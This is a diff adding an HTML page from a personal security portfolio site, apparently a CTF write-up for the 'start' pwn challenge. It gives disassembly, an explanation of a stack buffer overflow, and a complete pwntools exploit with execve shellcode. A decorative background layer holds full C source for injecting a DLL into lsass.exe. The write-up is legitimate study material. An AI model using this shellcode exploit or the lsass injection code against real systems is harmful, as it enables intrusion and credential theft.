@@ -1,0 +1,258 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Start</title>
+    <meta name="description" content="A digital garden for System Exploitation & Reverse Engineering.">
+    
+    <!-- Open Graph Metadata -->
+    <meta property="og:title" content="Start" />
+    <meta property="og:description" content="System Exploitation and Reverse Engineering Portfolio" />
+    <meta property="og:type" content="website" />
+    <meta property="og:image" content="http://localhost:4000/assets/img/re_background.png" />
+    
+    <link rel="stylesheet" href="/assets/css/style.css">
+</head>
+<body>
+    <!-- Authentic Code Background Layer (Windows Exploit Context) -->
+    <div id="bg-code-layer" aria-hidden="true">
+#include &lt;windows.h&gt;
+#include &lt;iostream&gt;
+#include &lt;tlhelp32.h&gt;
+
+// Internal structures for PEB and API Hooking
+typedef struct _UNICODE_STRING {
+    USHORT Length;
+    USHORT MaximumLength;
+    PWSTR  Buffer;
+} UNICODE_STRING, *PUNICODE_STRING;
+
+DWORD FindProcessId(const std::wstring& processName) {
+    PROCESSENTRY32 processInfo;
+    processInfo.dwSize = sizeof(processInfo);
+
+    HANDLE processesSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
+    if (processesSnapshot == INVALID_HANDLE_VALUE) return 0;
+
+    Process32First(processesSnapshot, &processInfo);
+    if (!processName.compare(processInfo.szExeFile)) {
+        CloseHandle(processesSnapshot);
+        return processInfo.th32ProcessID;
+    }
+
+    while (Process32Next(processesSnapshot, &processInfo)) {
+        if (!processName.compare(processInfo.szExeFile)) {
+            CloseHandle(processesSnapshot);
+            return processInfo.th32ProcessID;
+        }
+    }
+
+    CloseHandle(processesSnapshot);
+    return 0;
+}
+
+int main() {
+    LPCSTR dllPath = "C:\\Payloads\\KAAAMMUUI_Hook.dll";
+    DWORD processId = FindProcessId(L"lsass.exe");
+
+    if (!processId) {
+        std::cerr << "[-] Target process not found." << std::endl;
+        return 1;
+    }
+
+    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
+    if (!hProcess) {
+        std::cerr << "[-] Failed to open process." << std::endl;
+        return 1;
+    }
+
+    LPVOID pDllPath = VirtualAllocEx(hProcess, 0, strlen(dllPath) + 1, MEM_COMMIT, PAGE_READWRITE);
+    WriteProcessMemory(hProcess, pDllPath, (LPVOID)dllPath, strlen(dllPath) + 1, 0);
+
+    HANDLE hLoadThread = CreateRemoteThread(hProcess, 0, 0,
+        (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandleA("Kernel32.dll"), "LoadLibraryA"),
+        pDllPath, 0, 0);
+
+    WaitForSingleObject(hLoadThread, INFINITE);
+    VirtualFreeEx(hProcess, pDllPath, strlen(dllPath) + 1, MEM_RELEASE);
+    CloseHandle(hLoadThread);
+    CloseHandle(hProcess);
+
+    std::cout << "[+] Payload successfully injected into memory space." << std::endl;
+    return 0;
+}
+    </div>
+
+    <div class="glow-orb-1"></div>
+    <div class="glow-orb-2"></div>
+
+    <header>
+        <div class="container">
+            <a href="/" class="site-title">KAAAMMUUI</a>
+            <nav>
+                <a href="/" >Home</a>
+                <a href="/projects/" >Projects</a>
+                <a href="/game-modding/" >Game Modding</a>
+                <a href="/writeups/" class="active">CTF Writeups</a>
+                <a href="/notes/" >Notes</a>
+            </nav>
+        </div>
+    </header>
+
+    <main>
+        <div class="container page-layout">
+    <article class="post">
+        <header class="post-header">
+            <h1>Start</h1>
+            
+            <p class="post-meta">Published: May 9, 2026</p>
+            
+            
+            <p style="color: var(--text-muted); margin-top: 5px; font-size: 0.9rem;">Tags: </p>
+            
+        </header>
+
+        <div class="post-content" id="post-content">
+            <p><strong>Flag:</strong> <code class="language-plaintext highlighter-rouge">FLAG{Pwn4bl3_tW_1s_y0ur_st4rt}</code></p>
+
+<h2 id="approach-step-by-step">Approach (Step by Step)</h2>
+
+<ol>
+  <li>The challenge provides a binary named <code class="language-plaintext highlighter-rouge">start</code>. Running <code class="language-plaintext highlighter-rouge">file</code> and <code class="language-plaintext highlighter-rouge">checksec</code> on it reveals it’s a 32-bit statically linked executable with almost all binary protections disabled (No Canary, NX disabled, No PIE).</li>
+  <li>The binary is extremely small (564 bytes) and only contains <code class="language-plaintext highlighter-rouge">_start</code> and <code class="language-plaintext highlighter-rouge">_exit</code> routines.</li>
+  <li>Disassembling <code class="language-plaintext highlighter-rouge">_start</code> in <code class="language-plaintext highlighter-rouge">gdb</code>:</li>
+</ol>
+
+<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">0</span><span class="nf">x8048060</span> <span class="o">&lt;</span><span class="nv">_start</span><span class="o">&gt;</span><span class="p">:</span>    <span class="nv">push</span>   <span class="nb">esp</span>
+<span class="err">0</span><span class="nf">x8048061</span> <span class="o">&lt;</span><span class="nv">_start</span><span class="o">+</span><span class="mi">1</span><span class="o">&gt;</span><span class="p">:</span>  <span class="nv">push</span>   <span class="mh">0x804809d</span>      <span class="c1">; push address of _exit</span>
+<span class="err">0</span><span class="nf">x8048066</span> <span class="o">&lt;</span><span class="nv">_start</span><span class="o">+</span><span class="mi">6</span><span class="o">&gt;</span><span class="p">:</span>  <span class="nv">xor</span>    <span class="nb">eax</span><span class="p">,</span><span class="nb">eax</span>
+<span class="err">0</span><span class="nf">x8048068</span> <span class="o">&lt;</span><span class="nv">_start</span><span class="o">+</span><span class="mi">8</span><span class="o">&gt;</span><span class="p">:</span>  <span class="nv">xor</span>    <span class="nb">ebx</span><span class="p">,</span><span class="nb">ebx</span>
+<span class="err">0</span><span class="nf">x804806a</span> <span class="o">&lt;</span><span class="nv">_start</span><span class="o">+</span><span class="mi">10</span><span class="o">&gt;</span><span class="p">:</span> <span class="nv">xor</span>    <span class="nb">ecx</span><span class="p">,</span><span class="nb">ecx</span>
+<span class="err">0</span><span class="nf">x804806c</span> <span class="o">&lt;</span><span class="nv">_start</span><span class="o">+</span><span class="mi">12</span><span class="o">&gt;</span><span class="p">:</span> <span class="nv">xor</span>    <span class="nb">edx</span><span class="p">,</span><span class="nb">edx</span>
+<span class="err">0</span><span class="nf">x804806e</span> <span class="o">&lt;</span><span class="nv">_start</span><span class="o">+</span><span class="mi">14</span><span class="o">&gt;</span><span class="p">:</span> <span class="nv">push</span>   <span class="mh">0x3a465443</span>     <span class="c1">; "CTF:"</span>
+<span class="err">0</span><span class="nf">x8048073</span> <span class="o">&lt;</span><span class="nv">_start</span><span class="o">+</span><span class="mi">19</span><span class="o">&gt;</span><span class="p">:</span> <span class="nv">push</span>   <span class="mh">0x20656874</span>     <span class="c1">; "the "</span>
+<span class="err">0</span><span class="nf">x8048078</span> <span class="o">&lt;</span><span class="nv">_start</span><span class="o">+</span><span class="mi">24</span><span class="o">&gt;</span><span class="p">:</span> <span class="nv">push</span>   <span class="mh">0x20747261</span>     <span class="c1">; "art "</span>
+<span class="err">0</span><span class="nf">x804807d</span> <span class="o">&lt;</span><span class="nv">_start</span><span class="o">+</span><span class="mi">29</span><span class="o">&gt;</span><span class="p">:</span> <span class="nv">push</span>   <span class="mh">0x74732073</span>     <span class="c1">; "s st"</span>
+<span class="err">0</span><span class="nf">x8048082</span> <span class="o">&lt;</span><span class="nv">_start</span><span class="o">+</span><span class="mi">34</span><span class="o">&gt;</span><span class="p">:</span> <span class="nv">push</span>   <span class="mh">0x2774654c</span>     <span class="c1">; "Let'"</span>
+<span class="err">0</span><span class="nf">x8048087</span> <span class="o">&lt;</span><span class="nv">_start</span><span class="o">+</span><span class="mi">39</span><span class="o">&gt;</span><span class="p">:</span> <span class="nv">mov</span>    <span class="nb">ecx</span><span class="p">,</span><span class="nb">esp</span>        <span class="c1">; ecx points to the string</span>
+<span class="err">0</span><span class="nf">x8048089</span> <span class="o">&lt;</span><span class="nv">_start</span><span class="o">+</span><span class="mi">41</span><span class="o">&gt;</span><span class="p">:</span> <span class="nv">mov</span>    <span class="nb">dl</span><span class="p">,</span><span class="mh">0x14</span>        <span class="c1">; length = 20</span>
+<span class="err">0</span><span class="nf">x804808b</span> <span class="o">&lt;</span><span class="nv">_start</span><span class="o">+</span><span class="mi">43</span><span class="o">&gt;</span><span class="p">:</span> <span class="nv">mov</span>    <span class="nb">bl</span><span class="p">,</span><span class="mh">0x1</span>         <span class="c1">; fd = stdout</span>
+<span class="err">0</span><span class="nf">x804808d</span> <span class="o">&lt;</span><span class="nv">_start</span><span class="o">+</span><span class="mi">45</span><span class="o">&gt;</span><span class="p">:</span> <span class="nv">mov</span>    <span class="nb">al</span><span class="p">,</span><span class="mh">0x4</span>         <span class="c1">; sys_write</span>
+<span class="err">0</span><span class="nf">x804808f</span> <span class="o">&lt;</span><span class="nv">_start</span><span class="o">+</span><span class="mi">47</span><span class="o">&gt;</span><span class="p">:</span> <span class="nv">int</span>    <span class="mh">0x80</span>           <span class="c1">; write(1, "Let's start the CTF:", 20)</span>
+<span class="err">0</span><span class="nf">x8048091</span> <span class="o">&lt;</span><span class="nv">_start</span><span class="o">+</span><span class="mi">49</span><span class="o">&gt;</span><span class="p">:</span> <span class="nv">xor</span>    <span class="nb">ebx</span><span class="p">,</span><span class="nb">ebx</span>        <span class="c1">; fd = stdin</span>
+<span class="err">0</span><span class="nf">x8048093</span> <span class="o">&lt;</span><span class="nv">_start</span><span class="o">+</span><span class="mi">51</span><span class="o">&gt;</span><span class="p">:</span> <span class="nv">mov</span>    <span class="nb">dl</span><span class="p">,</span><span class="mh">0x3c</span>        <span class="c1">; length = 60</span>
+<span class="err">0</span><span class="nf">x8048095</span> <span class="o">&lt;</span><span class="nv">_start</span><span class="o">+</span><span class="mi">53</span><span class="o">&gt;</span><span class="p">:</span> <span class="nv">mov</span>    <span class="nb">al</span><span class="p">,</span><span class="mh">0x3</span>         <span class="c1">; sys_read</span>
+<span class="err">0</span><span class="nf">x8048097</span> <span class="o">&lt;</span><span class="nv">_start</span><span class="o">+</span><span class="mi">55</span><span class="o">&gt;</span><span class="p">:</span> <span class="nv">int</span>    <span class="mh">0x80</span>           <span class="c1">; read(0, esp, 60)</span>
+<span class="err">0</span><span class="nf">x8048099</span> <span class="o">&lt;</span><span class="nv">_start</span><span class="o">+</span><span class="mi">57</span><span class="o">&gt;</span><span class="p">:</span> <span class="nv">add</span>    <span class="nb">esp</span><span class="p">,</span><span class="mh">0x14</span>       <span class="c1">; clean up the string from stack</span>
+<span class="err">0</span><span class="nf">x804809c</span> <span class="o">&lt;</span><span class="nv">_start</span><span class="o">+</span><span class="mi">60</span><span class="o">&gt;</span><span class="p">:</span> <span class="nv">ret</span>                   <span class="c1">; jump to return address</span>
+</code></pre></div></div>
+
+<ol>
+  <li>The program pushes the string <code class="language-plaintext highlighter-rouge">"Let's start the CTF:"</code> onto the stack (20 bytes), then calls <code class="language-plaintext highlighter-rouge">sys_write</code> to print it.</li>
+  <li>It then calls <code class="language-plaintext highlighter-rouge">sys_read</code> to read up to 60 bytes into the stack buffer.</li>
+  <li>After reading, it adds <code class="language-plaintext highlighter-rouge">0x14</code> (20 bytes) to <code class="language-plaintext highlighter-rouge">esp</code>, effectively bypassing the string we printed, and executes <code class="language-plaintext highlighter-rouge">ret</code>. The address it returns to is the <code class="language-plaintext highlighter-rouge">_exit</code> address pushed at <code class="language-plaintext highlighter-rouge">0x8048061</code>.</li>
+  <li><strong>Vulnerability:</strong> Since we can read 60 bytes but the buffer is only 20 bytes away from the return address, we have a classic buffer overflow. We need <code class="language-plaintext highlighter-rouge">20</code> bytes of padding to reach the return address, leaving us <code class="language-plaintext highlighter-rouge">60 - 24 = 36</code> bytes for our shellcode.</li>
+</ol>
+
+<h3 id="stage-1-stack-leak">Stage 1: Stack Leak</h3>
+<p>Since ASLR is likely enabled on the remote server and the stack address changes, we cannot jump to our shellcode directly. We need a stack leak first.
+We can overwrite the return address with the address of the <code class="language-plaintext highlighter-rouge">sys_write</code> call within the binary itself (<code class="language-plaintext highlighter-rouge">0x08048087</code>).</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">payload</span>  <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">A</span><span class="sh">'</span> <span class="o">*</span> <span class="mi">20</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="nf">p32</span><span class="p">(</span><span class="mh">0x08048087</span><span class="p">)</span>
+</code></pre></div></div>
+<p>When <code class="language-plaintext highlighter-rouge">ret</code> is executed, it jumps back to <code class="language-plaintext highlighter-rouge">mov ecx, esp</code>, but <code class="language-plaintext highlighter-rouge">esp</code> now points further down the stack to a saved stack pointer. The <code class="language-plaintext highlighter-rouge">write</code> syscall will leak 20 bytes from the stack including this stack address, and then the program will execute <code class="language-plaintext highlighter-rouge">sys_read</code> again, waiting for a second payload!</p>
+
+<h3 id="stage-2-shellcode-execution">Stage 2: Shellcode Execution</h3>
+<p>By receiving the first 4 bytes from the leak, we can calculate the exact address where our shellcode will be stored (<code class="language-plaintext highlighter-rouge">esp + 20</code>).
+We can then send a second payload that overwrites the return address with the address of our shellcode, followed by the shellcode itself.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">shellcode_addr</span> <span class="o">=</span> <span class="n">esp</span> <span class="o">+</span> <span class="mh">0x14</span>
+<span class="n">payload</span>  <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">A</span><span class="sh">'</span> <span class="o">*</span> <span class="mi">20</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="nf">p32</span><span class="p">(</span><span class="n">shellcode_addr</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">shellcode</span>
+</code></pre></div></div>
+
+<h3 id="exploit-script">Exploit Script</h3>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">context</span><span class="p">.</span><span class="n">arch</span> <span class="o">=</span> <span class="sh">'</span><span class="s">i386</span><span class="sh">'</span>
+<span class="n">context</span><span class="p">.</span><span class="n">os</span> <span class="o">=</span> <span class="sh">'</span><span class="s">linux</span><span class="sh">'</span>
+
+<span class="c1"># p = process('./start')
+</span><span class="n">p</span> <span class="o">=</span> <span class="nf">remote</span><span class="p">(</span><span class="sh">'</span><span class="s">chall.pwnable.tw</span><span class="sh">'</span><span class="p">,</span> <span class="mi">10000</span><span class="p">)</span>
+
+<span class="c1"># 25-byte execve("/bin/sh") shellcode
+</span><span class="n">shellcode</span>  <span class="o">=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x31\xc0\x50\x68\x2f\x2f\x73\x68</span><span class="sh">"</span>
+<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x68\x2f\x62\x69\x6e\x89\xe3\x50</span><span class="sh">"</span>
+<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80</span><span class="sh">"</span>
+
+<span class="c1"># Receive initial banner
+</span><span class="n">p</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">CTF:</span><span class="sh">'</span><span class="p">)</span>
+
+<span class="c1"># Stage 1 - Leak stack
+</span><span class="n">leak_gadget</span> <span class="o">=</span> <span class="mh">0x08048087</span>
+
+<span class="n">payload</span>  <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">A</span><span class="sh">'</span> <span class="o">*</span> <span class="mi">20</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="nf">p32</span><span class="p">(</span><span class="n">leak_gadget</span><span class="p">)</span>
+
+<span class="n">p</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+
+<span class="c1"># Receive leaked ESP
+</span><span class="n">leak</span> <span class="o">=</span> <span class="n">p</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="mi">20</span><span class="p">)</span>
+<span class="n">esp</span> <span class="o">=</span> <span class="nf">u32</span><span class="p">(</span><span class="n">leak</span><span class="p">[:</span><span class="mi">4</span><span class="p">])</span>
+
+<span class="n">log</span><span class="p">.</span><span class="nf">success</span><span class="p">(</span><span class="sa">f</span><span class="sh">'</span><span class="s">Leaked ESP: </span><span class="si">{</span><span class="nf">hex</span><span class="p">(</span><span class="n">esp</span><span class="p">)</span><span class="si">}</span><span class="sh">'</span><span class="p">)</span>
+
+<span class="c1"># Shellcode will be after RET
+</span><span class="n">shellcode_addr</span> <span class="o">=</span> <span class="n">esp</span> <span class="o">+</span> <span class="mh">0x14</span>
+<span class="n">log</span><span class="p">.</span><span class="nf">info</span><span class="p">(</span><span class="sa">f</span><span class="sh">'</span><span class="s">Shellcode addr: </span><span class="si">{</span><span class="nf">hex</span><span class="p">(</span><span class="n">shellcode_addr</span><span class="p">)</span><span class="si">}</span><span class="sh">'</span><span class="p">)</span>
+
+<span class="c1"># Stage 2 - Execute shellcode
+</span><span class="n">payload</span>  <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">A</span><span class="sh">'</span> <span class="o">*</span> <span class="mi">20</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="nf">p32</span><span class="p">(</span><span class="n">shellcode_addr</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">shellcode</span>
+
+<span class="n">p</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+
+<span class="n">p</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
+</code></pre></div></div>
+
+        </div>
+    </article>
+    
+    <aside class="toc-container">
+        <div class="toc-sidebar" id="toc-sidebar">
+            <h3>On this page</h3>
+            <ul id="toc-list"></ul>
+        </div>
+    </aside>
+</div>
+
+    </main>
+
+    <footer>
+        <div class="container">
+            <div class="footer-socials" style="margin-bottom: 1rem; display: flex; justify-content: center; gap: 1.5rem;">
+                <a href="https://github.com/HimanshuP601" target="_blank">GitHub</a>
+                <a href="https://www.linkedin.com/in/himanshuparate/" target="_blank">LinkedIn</a>
+                <a href="https://medium.com/@HimanshuP601" target="_blank">Medium</a>
+                <a href="https://pwn.college/hacker/HimanshuP601" target="_blank">pwn.college</a>
+                <a href="mailto:himanshuparate601@gmail.com">Email</a>
+                <span style="color: var(--text-muted);">Discord: himasnhu</span>
+            </div>
+            
+            <div style="margin-bottom: 2rem; display: flex; justify-content: center;">
+                <a href="https://app.hackthebox.com/users/2410266" target="_blank">
+                    <img src="https://www.hackthebox.eu/badge/image/2410266" alt="Hack The Box Badge">
+                </a>
+            </div>
+
+            <p>&copy; 2026 Himanshu Kaaammuui. Hosted natively on GitHub Pages.</p>
+        </div>
+    </footer>
+    <script src="/assets/js/main.js"></script>
+</body>
+</html>
